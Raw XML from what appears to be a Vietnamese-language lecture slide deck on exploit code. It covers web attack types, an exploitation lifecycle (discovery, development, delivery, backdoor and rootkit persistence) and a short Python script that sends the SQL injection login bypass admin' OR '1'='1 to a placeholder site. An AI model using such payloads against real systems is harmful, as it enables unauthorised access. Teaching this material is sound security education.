            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>5. Web Application Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tấn công lỗ hổng ứng dụng web.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ: SQL Injection, XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9103226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64502"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ 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93353"/>
            <a:ext cx="10515601" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>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Python exploit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gửi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payload SQL Injection:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>import</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"http://target-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>site.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/login"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>payload = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"username": "admin' OR '1'='1", "password": "anything"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>response = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>requests.post</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, data=payload)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Welcome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>response.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>[+] Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đăng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>nhập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> bypassed.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>[-] Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22807170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Quy</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bằng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rPr>
              <a:t>Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Code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338179" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Tìm kiếm lỗ hổng (Vulnerability Discovery)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sử dụng công cụ quét lỗ hổng (Nessus, OpenVAS, Nmap, Burp Suite).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phân tích mã nguồn hoặc cấu hình hệ thống để tìm ra điểm yếu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thu thập thông tin từ cơ sở dữ liệu công khai (CVE, NVD, Exploit-DB).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. Phát triển mã khai thác (Exploit Development)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Viết hoặc tùy chỉnh mã khai thác để tận dụng lỗ hổng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kiểm tra exploit trong môi trường giả lập (lab, sandbox).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tối ưu mã để tăng khả năng thực thi và tránh bị phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29099955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Quy</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bằng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rPr>
              <a:t>Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Code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338179" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Triển khai tấn công (Delivery &amp; Execution)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phát tán mã khai thác qua email, website, file đính kèm, hoặc kỹ thuật social engineering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thực thi exploit nhằm chiếm quyền điều khiển hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khai thác có thể tự động hoặc thủ công tùy mức độ phức tạp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>4. Duy trì truy cập (Backdoor, Rootkit, Trojan)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cài đặt backdoor để có thể quay lại hệ thống bất cứ lúc nào.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sử dụng rootkit để che giấu sự hiện diện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kết hợp trojan để mở rộng khả năng kiểm soát.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6636528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Quy</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bằng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rPr>
              <a:t>Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Code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542897" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
